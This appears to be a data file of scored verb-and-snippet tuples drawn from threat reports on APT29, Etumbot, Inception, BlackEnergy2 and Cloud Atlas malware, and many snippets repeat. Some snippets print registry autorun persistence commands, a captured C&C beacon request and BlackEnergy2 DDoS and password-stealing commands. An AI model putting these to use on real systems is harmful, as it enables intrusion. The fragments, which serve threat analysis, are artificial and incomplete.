\n\n\n\n\nT\n        he encrypted data in the image may include         \n        instructions to execute commands via               \n        PowerShell, execute a direct command or            \nfile, or save an executable to disk and execute it')(1.0, 'save', '\n\n</figure>\n\n <caption> Figure 6: Executing Commands and Removing Data </caption>                                        \n\n\n\n\nT\n        he encrypted data in the image may include         \n        instructions to execute commands via               \n        PowerShell, execute a direct command or            \nfile, or save an executable to disk and execute it')(0.5, 'using', '\n   Other tools use Twitter \nto relay\n   instructions, including:2\n<list>\n   •   MiniDuke, a \nWindows-based\n      backdoor that is a \nsuspected\n      Russian tool\n   •   the Sninfs botnet\n   •   Flashback, a Mac-based\n      backdoor\n</list>\n   MiniDuke behaves \nsimilarly\n   to HAMMERTOSS by not only\n   using Twitter for CnC, \nbut also\n   by downloading image \nfiles\n   containing encrypted, \nappended\n   content')(0.42857142857142855, 'uses', ' Likewise, the group\n   appears to almost solely uses compromised\n   servers for CnC to enhance the security of its\n   operations and maintains a rapid development\n   cycle for its malware by quickly modifying tools \nto\n   undermine detection')(1.0, 'adding', ' APT29 tries to\n                   undermine the detection of the malware by\n                                                                       \n                   adding layers of obfuscation and mimicking\n\n                   the behavior of legitimate users')(0.5384615384615384, 'upload', ' The data may\ninclude commands or login credentials to\n                                                   \nupload a victim’s data to a cloud storage          \nservice')(1.0, 'acquire', ' Each                                                    \n\n  variant uses different methods to acquire           \n  CnC instructions, either by directly\n  accessing a hard-coded website or                   \n  accessing Twitter as an intermediary')(0.75, 'deliver', '\n                               Using Twitter as an intermediary to deliver the\n                               second-stage CnC to HAMERTOSS allows APT29\n                               to dynamically direct the tool')(0.25925925925925924, 'makes', ' When\na READFILE command is received from the C&C, the bot makes an initial call to\n/manage/asp/item.asp?id=<encrypted computer name>&&mux=<encrypted total file size> and checks for\nthe presence of “I’m Ready” in the response from the C&C')(0.7777777777777778, 'send', ' The bot expects a\nmessage of “OK” from the C&C after each response is sent and will terminate the upload and send an\nerror message to the C&C in the case it is not seen')(0.6666666666666666, 'expects', ' The bot expects a\nmessage of “OK” from the C&C after each response is sent and will terminate the upload and send an\nerror message to the C&C in the case it is not seen')(0.7857142857142857, 'calls', '\n                   [6]\n\n                   <figure></figure>\n\nBelow are some of the names of Etumbot installers using RTLO successfully:\n\n<table>\n             File\t\n             \xa0name\t\n \xa0                                          Md5\t\n \xa0\n             招標規範 Finarcs.doc\t\n \xa0                                      b3830791b0a397bea2ad943d151f856b\t\n \xa0\n             1030522 新機關籌備小組清單 rcs.DOC\t\n \xa0                             d444be30d2773b23de38ead1f2c6d117\t\n \xa0\n             報價單 Finarcs.xls\t\n \xa0                                       5340fcfb3d2fa263c280e9659d13ba93\t\n \xa0\n             10342 委會-\xad‐審 金融法規修正草案報告 rcs.xls\t\n \xa0                       beb16ac99642f5c9382686fd8ee73e00\t\n \xa0\n             國發會 1030324 第 1 次委員會重要議題通報 finalrcs.xls\t\n \xa0               4c703a8cfeded7f889872a86fb7c70cf\t\n \xa0\n             APO\t\n \xa0EPIF\t\n \xa0邀請函 rcs.xls\t\n \xa0                            1ce47f76fca26b94b0b1d74610a734a4\t\n \xa0</table>\n </section>\n\n<section>\n<heading>Stage 2: Persistence, Distraction, HTTP Beacon and Crypto Functionality</heading>\nAs the backdoor executes from our previous example, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\\nkb71271.log is created and contains the following registry file to make the malware persistent:\n\n          [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] "JavaSvc"="C:\\\\Documents\n          and Settings\\\\User\\\\Application Data\\\\JAVA\\\\JavaSvc.exe"\n\nThe dropper then calls regedit with kb71271.log as a parameter to modify the registry')(0.6363636363636364, 'contains', '\n                   [6]\n\n                   <figure></figure>\n\nBelow are some of the names of Etumbot installers using RTLO successfully:\n\n<table>\n             File\t\n             \xa0name\t\n \xa0                                          Md5\t\n \xa0\n             招標規範 Finarcs.doc\t\n \xa0                                      b3830791b0a397bea2ad943d151f856b\t\n \xa0\n             1030522 新機關籌備小組清單 rcs.DOC\t\n \xa0                             d444be30d2773b23de38ead1f2c6d117\t\n \xa0\n             報價單 Finarcs.xls\t\n \xa0                                       5340fcfb3d2fa263c280e9659d13ba93\t\n \xa0\n             10342 委會-\xad‐審 金融法規修正草案報告 rcs.xls\t\n \xa0                       beb16ac99642f5c9382686fd8ee73e00\t\n \xa0\n             國發會 1030324 第 1 次委員會重要議題通報 finalrcs.xls\t\n \xa0               4c703a8cfeded7f889872a86fb7c70cf\t\n \xa0\n             APO\t\n \xa0EPIF\t\n \xa0邀請函 rcs.xls\t\n \xa0                            1ce47f76fca26b94b0b1d74610a734a4\t\n \xa0</table>\n </section>\n\n<section>\n<heading>Stage 2: Persistence, Distraction, HTTP Beacon and Crypto Functionality</heading>\nAs the backdoor executes from our previous example, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\\nkb71271.log is created and contains the following registry file to make the malware persistent:\n\n          [HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run] "JavaSvc"="C:\\\\Documents\n          and Settings\\\\User\\\\Application Data\\\\JAVA\\\\JavaSvc.exe"\n\nThe dropper then calls regedit with kb71271.log as a parameter to modify the registry')(0.5, 'copied', '\n\nNext, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log is created, filled with contents of the\nbait/distraction file, and then copied to C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\~t3fcj1.doc, which is then\nopened')(0.875, 'filled', '\n\nNext, C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log is created, filled with contents of the\nbait/distraction file, and then copied to C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\~t3fcj1.doc, which is then\nopened')(0.625, 'creates', '\n\nWhen executed, the dropper loads up a resource named "BINARY" from the resource section then\ncreates the directory C:\\Documents and Settings\\User\\Application Data\\JAVA, then creates a temporary\nfile C:\\DOCUME~1\\User\\LOCALS~1\\Temp\\ka4281x3.log then creates C:\\Documents and\nSettings\\User\\Application Data\\JAVA\\JavaSvc.exe from the aforementioned BINARY resource')(0.8, 'installs', '\n\nReturning to the first sample, once the dropper (ff5a7a610746ab5492cc6ab284138852) installs the\nEtumbot backdoor (82d4850a02375a7447d2d0381b642a72), an initial HTTP beacon is sent to the\nCommand & Control server that requests an RC4 encryption key')(0.1951219512195122, 'sends', '\n\nOnce the bot has received the encryption key, the bot sends a registration callback to the C&C\n/image/<encrypted data>.jpg containing the encrypted values of system information to include the\nNetBIOS name of the system, user name, IP address, if the system is using a proxy (Yes/No), and a\nnumeric value which may be some type of campaign code')(0.047619047619047616, 'used', ' [1] A previous campaign using IXESHE malware was highlighted in 2012; the group\nused targeted emails with malicious PDF attachments to compromise East Asian governments,\nTaiwanese electronics manufacturers, and a telecommunications company')(0.6666666666666666, 'registered', '\n\nA contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as\nfollows:\n\n         WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147|\n\n<caption>A bot registration call to /image</caption>\n\n<figure></figure>\n\n\nOnce the bot has registered with the C&C, it will send periodic pings to ask for new commands to\nexecute')(0.5, 'send', '\n\nA contrived example of this registration string generated by the Etumbot backdoor prior to encryption is as\nfollows:\n\n         WINXPBOX|johnsmith|10.0.1.15|No Proxy|05147|\n\n<caption>A bot registration call to /image</caption>\n\n<figure></figure>\n\n\nOnce the bot has registered with the C&C, it will send periodic pings to ask for new commands to\nexecute')(0.5625, 'contains', ' The first is a dropper which contains the backdoor binary (the\nsecond component) and the distraction file')(0.5, 'discovers', '                                                               5\n</footer>\n\x0c\n<header>Arbor Security Report: ASERT Threat Intelligence Brief 2014-07</header>\n\n\n\n\nEtumbot discovers the proxy settings of the local machine')(0.38095238095238093, 'load', '\n</section>\n\n<section>\n<header>Use of Byte Strings Technique (aka “String Stacking”)</header>\nEtumbot uses a technique to load strings into memory that has been called “byte strings” and also “string\nstacking” whereby character values are loaded into a specific memory location one byte at a time')(0.6, 'begins', '\n\nBefore\xa0execution,\xa0the\xa0malware\xa0makes\xa0a\xa0couple\xa0of\xa0checks\xa0to\xa0avoid\xa0analysis,\xa0including\xa0checking\xa0for\xa0the\npresence\xa0of\xa0a\xa0debugger\xa0using\xa0IsDebuggerPresent\xa0as\xa0well\xa0as\xa0checking\xa0for\xa0the\xa0presence\xa0of\xa0VirtualBox\xa0by\nlooking\xa0for\xa0the\xa0device\xa0name\xa0\\\\.\\VBoxMiniRdrDN:\n\n\xa0\n\n\n\n\nThe\xa0malware\xa0also\xa0checks\xa0for\xa0the\xa0presence\xa0of\xa0several\xa0anti\xadvirus\xa0solutions,\xa0as\xa0well\xa0for\xa0any\xa0processes\nincluding\xa0the\xa0word\xa0‘security’:\n\x0cThe\xa0malware\xa0then\xa0proceeds\xa0to\xa0decrypt\xa0some\xa0basic\xa0configuration\xa0data,\xa0including\xa0the\xa0command\xa0&\xa0control\ndomain,\xa0and\xa0information\xa0about\xa0the\xa0origin\xa0of\xa0the\xa0infection,\xa0tracked\xa0via\xa0ID:\n\n\xa0\xa0\n\n\n\n\nMeanwhile,\xa0the\xa0malware\xa0begins\xa0calling\xa0home,\xa0whilst\xa0also\xa0keeping\xa0a\xa0log\xa0of\xa0its\xa0actions')(0.30434782608695654, 'keeping', '\n\nBefore\xa0execution,\xa0the\xa0malware\xa0makes\xa0a\xa0couple\xa0of\xa0checks\xa0to\xa0avoid\xa0analysis,\xa0including\xa0checking\xa0for\xa0the\npresence\xa0of\xa0a\xa0debugger\xa0using\xa0IsDebuggerPresent\xa0as\xa0well\xa0as\xa0checking\xa0for\xa0the\xa0presence\xa0of\xa0VirtualBox\xa0by\nlooking\xa0for\xa0the\xa0device\xa0name\xa0\\\\.\\VBoxMiniRdrDN:\n\n\xa0\n\n\n\n\nThe\xa0malware\xa0also\xa0checks\xa0for\xa0the\xa0presence\xa0of\xa0several\xa0anti\xadvirus\xa0solutions,\xa0as\xa0well\xa0for\xa0any\xa0processes\nincluding\xa0the\xa0word\xa0‘security’:\n\x0cThe\xa0malware\xa0then\xa0proceeds\xa0to\xa0decrypt\xa0some\xa0basic\xa0configuration\xa0data,\xa0including\xa0the\xa0command\xa0&\xa0control\ndomain,\xa0and\xa0information\xa0about\xa0the\xa0origin\xa0of\xa0the\xa0infection,\xa0tracked\xa0via\xa0ID:\n\n\xa0\xa0\n\n\n\n\nMeanwhile,\xa0the\xa0malware\xa0begins\xa0calling\xa0home,\xa0whilst\xa0also\xa0keeping\xa0a\xa0log\xa0of\xa0its\xa0actions')(0.875, 'initiated', '\n</section>\n\n\n\n<footer>37</footer>\n\x0c\n<section>\n<heading>Mobile malware: Android</heading>\n\n\nAccessing the link from an Android User-Agent initiated a download of an\nAndroid installer package named WhatsAppUpdate.apk')(1.0, 'uploaded', '\n\nThe encrypted files uploaded to the WebDAV shares come with their InitVectors\nstored at the end of the file')(0.7142857142857143, 'uploaded', '\nRecordings are stored as *.mp4 files, and uploaded to the attackers periodically')(0.8823529411764706, 'checks', '\n\nThe binary also checks a separate folder on the cloud service designated to\ncontain new configuration information')(0.4375, 'uploaded', '\n</list>\n\n\n\n<footer>41</footer>\n\x0c\nThese data are encrypted and uploaded to an FTP account which is taken from\nan encrypted configuration file named /usr/bin/cores')(0.875, 'downloaded', '\n</section>\n\n\n\n<footer>46</footer>\n\x0c\n<section>\n<heading>The Chinese connection</heading>\n\nOn at least two occasions during our surveillance of the Inception framework, the\nmalware downloaded something unexpected and wholly different from what we\nhave discussed until now')(0.5, 'connect', '\n</list>\nAfter a router SOCKSS port was opened by Unlocker, this IP would connect to\nthe opened port and tunnel its email traffic through the router')(0.6666666666666666, 'tunnel', '\n</list>\nAfter a router SOCKSS port was opened by Unlocker, this IP would connect to\nthe opened port and tunnel its email traffic through the router')(0.5, 'have', '\n\nFirst of all, we have the decoy documents which indicate an interest in:\n<list>\n   -   Embassies\n   -   Politics\n   -   Finance\n   -   Military\n   -   Engineering\n</list>\nWe also have a set of phishing mails, which were targeted at:\n<list>\n   -   The finance sector in Russia\n   -   The oil and energy industry in Romania, Venezuela, and Mozambique\n   -   Embassies and diplomats from various countries\n</list>\n\n</section>\n\n<footer>10</footer>\n\x0c\n<section>\n<heading>Shellcode</heading>\n\n\nThe shellcode used is a pretty standard variant previously used by a number of\ncampaigns typically operating out of China, but with some minor changes')(0.23333333333333334, 'utilize', '\n\n              The attackers utilize compromised embedded devices – typically routers- on the\n              Internet as well as multiple dedicated hosting providers and VPN services to\n              mask their identity from the cloud storage provider and others')(0.7142857142857143, 'drops', ' This seems adapted from Microsoft example code, like\nthe one found at http://msdn.microsoft.com/en-us/library/aa387236(v=vs.85).aspx\n\n<figure></figure>\n\n\nWhen the VBSript is run it drops two files to disk')(0.22727272727272727, 'is', ' It is a downloader and remote shell program,\ndesigned to connect to a C&C server to interact with the attacker and/or\ndownload more malware')(0.6428571428571429, 'connect', ' It is a downloader and remote shell program,\ndesigned to connect to a C&C server to interact with the attacker and/or\ndownload more malware')(0.8181818181818182, 'load', '\n\nThis configuration information is used to load the encrypted file into memory and\ndecrypt it')(0.7777777777777778, 'sent', ' All of this is encrypted and then\nsent to cloud storage via WebDAV')(0.75, 'checks', ' The malware\nalso checks configured subfolders for updates; and if these are found they will be\ndownloaded, decrypted and used as appropriate')(0.6, 'free', '\nThe order, size, and locations of these segments vary from build to build but\nsomewhere near the end of the large function there will be a call to a subfunction\nthat loads the PE image into memory, followed by a call to free the PE image\nallocation from memory')(0.8, 'loads', '\nThe order, size, and locations of these segments vary from build to build but\nsomewhere near the end of the large function there will be a call to a subfunction\nthat loads the PE image into memory, followed by a call to free the PE image\nallocation from memory')(0.8181818181818182, 'connect', '\n\n</section>\n\n\n<footer>22</footer>\n\x0c\n<section>\n<heading>The Sheep and the Wolves</heading>\n\nVictims of this attack will connect using the Windows WebDAV redirector, and\nthe HTTP request user-agent string will reflect this')(0.8, 'use', '\n\nWe identified four IP addresses that connected to the proxy malware:\n<list>\nCloud enumerator:\nApparently a rented server at AS34224 NETERRA-AS, Bulgaria\n</list>\nThis host belongs to a Bulgarian VPS service and would use the router proxy to\nconnect to webdav.cloudme.com')(0.5, 'connected', '\n\nWe identified four IP addresses that connected to the proxy malware:\n<list>\nCloud enumerator:\nApparently a rented server at AS34224 NETERRA-AS, Bulgaria\n</list>\nThis host belongs to a Bulgarian VPS service and would use the router proxy to\nconnect to webdav.cloudme.com')(0.38461538461538464, 'unlocked', '\n</list>\nTraffic from this IP had a very specific purpose: It unlocked routers for proxying in\nconnection with the sending of phishing emails')(0.42857142857142855, 'writes', ' The\nmalicious content is stored inside the document in encoded form, and the\nshellcode decodes and writes this to disk')(0.07142857142857142, 'randomized', ' – clearly randomized in\norder to avoid detection by name')(0.55, 'triggered', '\n</section>\n\n\n\n<footer>40</footer>\n\x0c\n<section>\n<heading>Mobile malware: Apple IOS</heading>\n\n\nUsing an IOS User-Agent triggered the download of a Debian installer package,\nWhatsAppUpdate.deb, also 1.2Mb in size')(0.3333333333333333, 'load', ' When executed it will rebuild the original dll\n(95Num3p3gm.dll, presumably), load it from memory and pass over execution')(0.7777777777777778, 'pull', ' They are lightweight and intended to pull specific\nsurvey information from their target')(0.12903225806451613, 'retrieves', '\n\n921.bin retrieves several datapoints about the infected machine: Domain info; a\nlist of running processes with all loaded modules in each; the list of installed\nsoftware; and a complete hardware profile of the target machine')(0.8181818181818182, 'send', ' Immediately\nafter, the newly opened port would be connected to by another IP and used to\nsend phishing emails with malicious attachments')(0.23076923076923078, 'issue', '\n\nThe malware is able to collect a lot of other information, not all of which is\nactually used:\n<list>\n   •   Account data\n   •   Location\n   •   Contacts\n   •   External and Internal Storage (files written)\n   •   Audio (microphone)\n   •   Outgoing calls\n   •   Incoming calls\n   •   Call log\n   •   Calendar\n   •   Browser bookmarks\n   •   Incoming SMS\n</list>\nThrough the encrypted C&C protocol, the attackers can issue commands and\nbinary updates to the malware')(0.5333333333333333, 'collect', '\n\nThe malware is able to collect a lot of other information, not all of which is\nactually used:\n<list>\n   •   Account data\n   •   Location\n   •   Contacts\n   •   External and Internal Storage (files written)\n   •   Audio (microphone)\n   •   Outgoing calls\n   •   Incoming calls\n   •   Call log\n   •   Calendar\n   •   Browser bookmarks\n   •   Incoming SMS\n</list>\nThrough the encrypted C&C protocol, the attackers can issue commands and\nbinary updates to the malware')(1.0, 'connect', '\n\nIn the wild we observed this IP connect to our router on the malware\nmanagement port and specify a SOCKSS proxy port to be opened')(0.5, 'connecting', '\n\nWhen connecting to this server, sccm.exe issues the following request:\n\n<figure>\nPOST /check.jsp HTTP/1.1\nAccept: */*..Accept-Language:en-us\nContent-Type: application/octet-stream\nAccept-Encoding: gzip, deflate\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\nHost: www.antivir.com\nContent-Length: 8\nConnection: Keep-Alive\nCache-Control: no-cache\n</figure>\n\nThis C&C domain is used by many other malwares related to sccm.exe; some of\nwhich share obvious connections to the Quarian malware family, a known APT\nintrusion tool')(0.3333333333333333, 'coming', '\n</section>\n\n\n\n<footer>32</footer>\n\x0c\n<cover>\n<heading>\nPART III:\n\nAttacks on mobile devices\n</heading>\n</cover>\n\n\n\n<footer>33</footer>\n\x0c\n<section>\nOne of the spearphishing mails we observed coming through the router network\nwas this one, sent to an address under the gov.py (Government of Paraguay)\ndomain')(0.25, 'sent', '\n</section>\n\n\n\n<footer>32</footer>\n\x0c\n<cover>\n<heading>\nPART III:\n\nAttacks on mobile devices\n</heading>\n</cover>\n\n\n\n<footer>33</footer>\n\x0c\n<section>\nOne of the spearphishing mails we observed coming through the router network\nwas this one, sent to an address under the gov.py (Government of Paraguay)\ndomain')(1.0, 'had', ' In that\nparticular case we had the actual phishing email, so we knew the apparent\nrecipient – the CEO of a large Russian bank')(0.4444444444444444, 'is', '\n\nThe C&C server in this case is ict32.msname.org')(0.625, 'send', '\nAfter being proxied though the router, each of these would authenticate with one\nof the dedicated mail proxies and send out phishing attacks')(0.8181818181818182, 'drops', '\n\n<figure></figure>\n\n\n<caption>Above: The decoding loop</caption>\n\n\nUpon successful execution this code drops a Word document and a Visual Basic\nscript')(1.0, 'identify', ' This allows the attackers to uniquely identify every\ntargeted attack and track how successful each phishing campaign is')(0.5833333333333334, 'sent', '\n\n\n\n\n<footer>31</footer>\n\x0c\nThe email shown above was one of a number of messages sent to targets in the\noil industry')(0.8461538461538461, 'tunneling', ' Once received the malware would attempt to connect to the\ndomain name on the specified port and would start tunneling all traffic received\nfrom the SOCKSS port to the destination and vise-versa')(0.6666666666666666, 'connect', ' Once received the malware would attempt to connect to the\ndomain name on the specified port and would start tunneling all traffic received\nfrom the SOCKSS port to the destination and vise-versa')(0.8888888888888888, 'utilized', ' They turned out\nto belong to a highly advanced and professional targeted attack framework,\nwhich utilized a complex series of techniques to survey potential targets')(0.6666666666666666, 'relay', ' The mail proxy would then relay the spearphishing mail as\nseen below')(0.058823529411764705, 'collects', ' This collects:\n<list>\n   •   deviceName, manufacturerName\n   •   platformVersion, softwareVersion\n   •   brandVendorId, brandVersion\n   •   total and free flash size of the device\n   •   amount of memory/storage already allocated\n   •   ownerName, ownerInformation\n   •   Phone mumber\n   •   PIN\n   •   IMSI\n   •   IMEI\n   •   mcc and mnc (Mobile Carrier ID)\n   •   cellID\n   •   Location area code\n   •   isPasswordEnabled\n   •   Battery data (level, temperature, voltage, etc)\n   •   Installed applications\n   •   Address book\n   •   APChannel\n   •   Connected Network Type\n   •   BSSID\n   •   DataRate\n   •   Profile Name\n   •   RadioBand\n   •   SecurityCategory\n   •   SignalLevel\n   •   SSID\n</list>\nCollected data will be uploaded to a DynDNS domain currently hosted on a US\nwebhosting service')(1.0, 'downloads', ' If such a file is present on the server, the\nmalware downloads the new configuration file then deletes it from the server')(0.6, 'transfer', '\nAdditionally, once the resource is established, the malware can transfer files to\nand from the command and control servers using standard file IO commands')(0.5, 'execute', '\n\nThe VBScript then sets a startup key in the\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” registry path to\nexecute the DLLs at boot time')(1.0, 'sets', '\n\nThe VBScript then sets a startup key in the\n“HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” registry path to\nexecute the DLLs at boot time')(0.06666666666666667, 'collect', '\n\n\nOnce installed, it may collect\n<list>\n   •   Device platform, name, model, system name, system version\n   •   ICCID\n   •   User’s address book\n   •   Roaming status\n   •   Phone number\n   •   Carrierbundlename\n   •   Iso country name\n   •   Carrier name\n   •   Wifi status\n   •   MAC address\n   •   Device battery level\n   •   Free and total space\n   •   Cpu frequency and count\n   •   Total and user memory\n   •   Maxsocketbuffersize\n   •   Language local identifier and language display name\n   •   Default and local time zone\n   •   Account data: AccountAvailableServiceTypes, AccountKind,\n       AccountSocialEnabled, etc\n   •   AppleID\n   •   CreditDisplayString\n   •   DSPersonID\n   •   IOS specific data; ex LastBackupComputerName,\n       LastBackupComputerType, iTunes.store-UserName, iTunes.store-\n       downloaded-apps etc')(0.375, 'deleted', ' As with other plugins, these are downloaded and deleted from the\nshare in one go')(0.42857142857142855, 'record', '\n\nThe apparent main purpose of this malware is to record phone call audio')(0.8181818181818182, 'retrieve', '\n\nUpon execution the binary uses its hardcoded key to decrypt the configuration\nsection and retrieve the listening port to use for incoming connections')(0.5625, 'containing', ' When decrypted, these turned out to be dropper\npackages containing one dropper executable clearly created for the Inception\nframework, and one other, very different executable')(1.0, 'downloaded', ' In this account there was hidden another encrypted\nconfiguration file which the malware downloaded and decrypted')(0.8181818181818182, 'used', '\nCommon across multiple accounts, multiple IP’s, and over time, is that the\nprobable attackers have used a HTTP user-agent of “davfs2/1.4.6 neon/0.29.6”')(0.5, 'scouting', ' Inception has the capacity to perform all steps needed for scouting\nout and exfiltrating data without resorting to traditional hosted command &\ncontrol')(0.6923076923076923, 'using', ' By using a well-understood APT tool and a known malicious C&C\ndomain name, the attackers permit much clearer attribution')(0.8461538461538461, 'compromise', '\n\n<figure></figure>\n\n\nIt is believed that the attackers were able to compromise these devices based on\npoor configurations or default credentials')(0.14285714285714285, 'appear', ' In some cases the organization from which the phishing\nemail originates would appear to be a known associate to the target')(0.625, 'used', '\n\n\n\n<footer>29</footer>\n\x0c\nMail proxies:\n\nThrough our router monitoring we identified two mail proxies used by the\nattackers')(0.5454545454545454, 'is', ' Our theory is that this malware is a\nmore typical datastealer, and we have observed that after this type of file is\nplanted on the account, encrypted data uploads from compromised users\nincrease')(0.631578947368421, 'pointing', ' The HTML source code reveals that the encoded portion is\nencapsulated in blog-index tags:\n\n<figure></figure>\n\n\nThe three accounts contain different configuration blocks pointing to C&C servers\napparently located in Poland, Germany and Russia, respectively')(0.8, 'drops', ' The one above\ndrops ctfmonrc.dll')(0.8, 'maintain', ' This means\nthat the attackers must maintain a list of where each of these implants are\ninstalled, as well as what port and key each is configured to use')(0.8461538461538461, 'gaining', " The 'vsnet' plugin was intended to spread and launch a\npayload (BlackEnergy2 dropper itself at the moment) in the local network by using PsExec, as well as\ngaining primary information on the user's computer and network")(0.4, 'stores', " The config files within BE2 contained the settings\nof the company's internal web proxy:\n\x0c\n\n<figure></figure>\n\n<caption>BE2 config file contains victim's internal proxy</caption>\n\nAs the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system (not seen in\nolder versions – all plugins were only in-memory), the administrators were able to collect BE2 files from\nthe infected machines")(0.9333333333333333, 'downloading', '\nBlackEnergy2 was eventually seen downloading more crimeware plugins - a custom spam plugin and a\nbanking information stealer custom plugin')(0.25, 'launching', ' Initially, cybercriminals used BlackEnergy custom\nplugins for launching DDoS attacks')(1.0, 'pushed', " By all appearances, the attackers pushed the 'dstr' module when they\nunderstood that they were revealed, and wanted to hide their presence on the machines")(1.0, 'launch', ' While another crimeware group continues to use BlackEnergy to launch DDoS\nattacks, the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and\nincluded custom plugins and scripts of their own')(0.8571428571428571, 'delivered', ' Though unusual, the ARM module was delivered by the same server and\nit processed the same config file')(0.9, 'download', '\n\nThe comment includes a punchy message for "kasperRsky":\n\x0c\n\n<figure></figure>\n\n<caption>BE2 ciscoapi.tcl fragment</caption>\n\nKillint.tcl – uses Ciscoapi.tcl, implements destroying functions:\n\x0c\n\n<figure></figure>\n\n<caption>BE2 killint.tcl fragment</caption>\n\nThe script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files')(0.5, 'upload', ' Why would the attackers need\ninformation on usb and bios characteristics? It suggests that based on a specific USB and BIOS devices,\nthe attackers may upload specific plugins to carry out additional actions')(0.6363636363636364, 'downloaded', ' Starting in March 2014 and ending in July 2014, Siemens\n"ccprojectmgr.exe" downloaded and executed a handful of different payloads hosted\nat 94.185.85.122/favicon.ico')(1.0, 'delivered', ' The server definitely delivered config files not only for Windows, but\nalso for the ARM/MIPS platform')(0.5714285714285714, 'controlled', ' Our observation of related actions here:\n<table>\n u ps                              start password stealing (Windows)\n Ps_mps/ps_hwi start               start password stealing (Linux, MIPS, ARM)\n                                   rewrite hook module with a new version and launch it\n uper_mps/uper_hwi start\n                                   (Linux, MIPS, ARM)\n Nm_mps/nm_hwi start –             Scan ports and retrieve banners on the router subnet\n ban -middle                       (Linux, MIPS, ARM)\n U fsget * 7 *.docx, *.pdf,\n                                   search for docs with the given filetypes (Windows)\n *.doc *\n                                   retrieve information on installed programs and launch\n S sinfo                           commands: systeminfo, tasklist, ipconfig, netstat, route\n                                   table, trace route to google.com (Windows)\n weap_mps/weap_hwi\n host188.128.123.52\n                                   DDoS on 188.128.123.52 (Linux, MIPS, ARM)\n port[25,26,110,465,995]\n typetcpconnect\n weap_mps/weap_hwi\n typesynflood port80\n                                   DDoS on 212.175.109.10 (Linux, MIPS, ARM)\n cnt100000 spdmedium\n host212.175.109.10\n</table>\nThe issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM\ndevices')(0.6666666666666666, 'loads', ' In turn, The malicious DLL\nloads a backdoor binary blob MD5: 16E5A27BD55E0B4E595C9743F4C75611 (ticrf.rat)')(1.0, 'load', ' LMS.exe will load any DLL file name\ndbghelp.dll that is found in the same path, hence the sideloading technique')(1.0, 'performing', " The evidence we've observed instead indicate that the MITM attack is performed either by\nperforming IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent\nSSL proxy")(0.6, 'running', '<doc>\n<section>\n<heading>Analysis of Chinese MITM on Google</heading>\nThursday, 04 September 2014 23:55:00 (UTC/GMT)\n\nThe Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and\nGoogle')(0.4666666666666667, 'connected', '\n\nWe previously observed only one other group using a similar method – ItaDuke – that connected to\naccounts on the cloud provider mydrive.ch')(0.8181818181818182, 'utilize', '\n</section>\n\n<section>\n<heading>C&C communication</heading>\n\nThe Cloud Atlas implants utilize a rather unusual C&C mechanism')(1.0, 'exploit', '\n\nInterestingly, some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit\nthe same theme and were used to target the same entity at different times')(0.8125, 'target', '\n\nInterestingly, some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit\nthe same theme and were used to target the same entity at different times')(0.07692307692307693, 'used', '\n\nSome of the filenames used in the attacks included:\n<list>\n       FT - Ukraine Russia\'s new art of war.doc\n       Катастрофа малайзийского лайнера.doc\n       Diplomatic Car for Sale.doc\n       МВКСИ.doc\n       Organigrama Gobierno Rusia.doc\n       Фото.doc\n       Информационное письмо.doc\n       Форма заявки (25-26.09.14).doc\n       Информационное письмо.doc\n\x0c\n      Письмо_Руководителям.doc\n      Прилож.doc\n      Car for sale.doc\n      Af-Pak and Central Asia\'s security issues.doc\n</list>\nAt least one of them immediately reminded us of RedOctober, which used a very similarly named\nspearphish: "Diplomatic Car for Sale.doc"')(0.7083333333333334, 'contain', "\n\nHere's a look at one such account from CloudMe:\n\n<figure></figure>\n\n\nThe data from the account:\n\x0c\n\n<figure></figure>\n\nThe files stored in the randomly named folder were uploaded by the malware and contain various things,\nsuch as system information, running processes and current username")(1.0, 'writes', ' Instead, it writes an encrypted Visual Basic Script and runs it')(0.6666666666666666, 'runs', ' Instead, it writes an encrypted Visual Basic Script and runs it')(0.23076923076923078, 'adds', ' For\ninstance, the "qPd0aKJu.vbs" file MD5:\n\x0c\nE211C2BAD9A83A6A4247EC3959E2A730 drops the following files:\n<list>\nDECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload\nD171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader\n</list>\nThe VBS also adds a registry key:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ setting the\nkey "bookstore" to the value "regsvr32 %path%\\ctfmonrn.dll /s", which ensures the malware runs every\ntime at system boot')(0.47619047619047616, 'setting', ' For\ninstance, the "qPd0aKJu.vbs" file MD5:\n\x0c\nE211C2BAD9A83A6A4247EC3959E2A730 drops the following files:\n<list>\nDECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload\nD171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader\n</list>\nThe VBS also adds a registry key:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ setting the\nkey "bookstore" to the value "regsvr32 %path%\\ctfmonrn.dll /s", which ensures the malware runs every\ntime at system boot')(0.1111111111111111, 'ensures', ' For\ninstance, the "qPd0aKJu.vbs" file MD5:\n\x0c\nE211C2BAD9A83A6A4247EC3959E2A730 drops the following files:\n<list>\nDECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload\nD171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader\n</list>\nThe VBS also adds a registry 